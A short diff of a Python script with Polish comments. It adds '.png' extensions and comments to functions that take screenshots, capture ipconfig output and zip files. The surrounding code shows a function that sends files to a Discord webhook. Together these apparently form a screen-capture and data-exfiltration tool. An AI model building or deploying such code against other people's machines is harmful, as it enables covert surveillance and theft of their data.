@@ -39,7 +39,7 @@ def send_file_to_discord(file_path, webhook_url):
 def take_screenshot(save_path):
     try:
         screenshot = pyautogui.screenshot()
-        screenshot.save(save_path)
+        screenshot.save(save_path)  # Zapisywanie z rozszerzeniem .png
         print(f"Zrzut ekranu zapisany w {save_path}")
         return save_path
     except Exception as e:
@@ -56,7 +56,7 @@ def create_zip_from_files(file_paths, zip_file_name):
                 file_name = os.path.basename(file)
                 
                 # Tworzymy unikalną nazwę pliku, dodając nazwę aplikacji
-                unique_file_name = f"{file_name} {app_name}"
+                unique_file_name = f"{file_name} {app_name}.png"  # Dodanie .png, jeśli to zrzut ekranu
                 
                 # Dodajemy plik do ZIP z nową nazwą
                 zipf.write(file, unique_file_name)
@@ -86,7 +86,7 @@ def take_ipconfig_screenshot():
         subprocess.run("ipconfig", shell=True, check=True)
         screenshot_path_ipconfig = os.path.join(os.environ['USERPROFILE'], 'Desktop', 'ipconfig_screenshot.png')
         screenshot_ipconfig = pyautogui.screenshot()
-        screenshot_ipconfig.save(screenshot_path_ipconfig)
+        screenshot_ipconfig.save(screenshot_path_ipconfig)  # Zapisywanie pliku .png
         print(f"Zrzut ekranu ipconfig zapisany w {screenshot_path_ipconfig}")
         return screenshot_path_ipconfig
     except Exception as e:
